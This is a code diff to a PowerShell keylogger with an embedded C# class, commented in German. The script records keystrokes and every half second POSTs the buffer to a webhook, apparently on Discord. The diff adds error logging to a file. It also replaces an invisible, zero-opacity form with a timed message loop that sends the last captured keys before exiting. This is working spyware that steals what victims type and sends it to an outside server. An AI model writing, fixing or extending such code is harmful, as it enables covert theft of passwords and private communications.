@@ -106,7 +106,14 @@ public static class KeyLogger
                     client.UploadString(_hookUrl, "POST", payload);
                 }
             }
-            catch {}
+                        catch (Exception ex)
+            {
+                try
+                {
+                    System.IO.File.AppendAllText("keylogger_error.log", DateTime.Now.ToString("o") + " - Exception in SendBuffer: " + ex.ToString() + Environment.NewLine);
+                }
+                catch {}
+            }
         }
     }
 }
@@ -134,23 +141,17 @@ $sendTimer.Interval = 500
 $sendTimer.add_Tick({ [KeyLogger]::SendBuffer() })
 $sendTimer.Start()
 
-# Unsichtbare Form für Message-Loop
-$form = New-Object System.Windows.Forms.Form
-$form.ShowInTaskbar = $false
-$form.WindowState = 'Minimized'
-$form.Opacity = 0
-$form.add_Load({
-    $timeoutTimer = New-Object System.Timers.Timer
-    $timeoutTimer.Interval = $timeout * 1000
-    $timeoutTimer.add_Elapsed({
-        $checkTimer.Stop()
-        $sendTimer.Stop()
-        [KeyLogger]::SendBuffer()  # Rest senden
-        [System.Windows.Forms.Application]::Exit()
-    })
-    $timeoutTimer.Start()
-})
-[System.Windows.Forms.Application]::Run($form)
+# Schleife für Message-Loop und Timeout
+$startTime = Get-Date
+while (((Get-Date) - $startTime).TotalSeconds -lt $timeout) {
+    [System.Windows.Forms.Application]::DoEvents()
+    Start-Sleep -Milliseconds 10
+}
+
+# Timer stoppen und Rest senden
+$checkTimer.Stop()
+$sendTimer.Stop()
+[KeyLogger]::SendBuffer()
 
 # Logger-Ende an Discord melden
 try {
